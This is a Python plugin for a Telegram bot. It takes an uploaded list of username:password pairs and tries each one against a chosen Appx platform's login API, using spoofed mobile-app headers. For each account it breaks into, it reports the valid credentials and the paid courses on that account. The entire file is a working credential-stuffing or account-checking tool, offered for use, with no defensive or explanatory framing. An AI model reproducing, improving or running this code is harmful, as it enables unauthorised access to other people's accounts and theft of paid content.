import requests
from Extractor import app
import json
import concurrent.futures
import requests
import asyncio
from pyrogram import Client, filters

def post_request(url, headers, data):
    return requests.post(url, headers=headers, data=data)

def get_request(url, headers):
    return requests.get(url, headers=headers)

async def login_and_get_courses(n, p, api, m):
    h = {
        "Host": api,
        "client-service": "Appx",
        "auth-key": "appxapi",
        "user-id": "-2",
        "authorization": "",
        "user_app_category": "",
        "language": "en",
        "device_type": "ANDROID",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/4.9.1"
    }
    d = {
        "email": n,
        "password": p,
        "devicetoken": "",
        "mydeviceid": "b9ed63e5d2a"
    }
    
    loop = asyncio.get_event_loop()
    r1 = await loop.run_in_executor(None, post_request, f"https://{api}/post/userLogin", h, d)
    r1 = r1.json()
    a = ""

    if "data" in r1 and "token" in r1["data"]:
        to = r1["data"]["token"]
        
        h["authorization"] = to
        a += f"{n}:{p}"
        r2 = await loop.run_in_executor(None, get_request, f"https://{api}/get/mycourseweb?userid=", h)
        r2 = r2.json()

        if "data" in r2:
            for i in r2["data"]:
                if "id" in i and "course_name" in i:
                    bi = i.get("id")
                    bn = i.get("course_name")
                    a += f"\n\n Login Success \n\n {bi} ☆ {bn}"
                    await m.reply_text(a)
    else:
        a = f"Failed to login for {n}:{p}"

    print(a)
    

@app.on_message(filters.command(["imjadu2"]))
async def pw_command_handler(bot, m):
    cfile = await bot.ask(m.chat.id, "Please upload the credential file which has 'username:password' in this format in each line:")
    file_id = cfile.document.file_id
    file_path = await bot.download_media(file_id)
    
    appx = await app.ask(m.chat.id, "Please enter the appx api (without http://) which id pass u wanna")
    api = appx.text.strip()

    with open(file_path, "r") as f:
        credentials_list = f.readlines()

    async def handle_credential_line(line):
        n, p = line.strip().split(':')
        await login_and_get_courses(n, p, api, m)

    await asyncio.gather(*(handle_credential_line(line) for line in credentials_list))
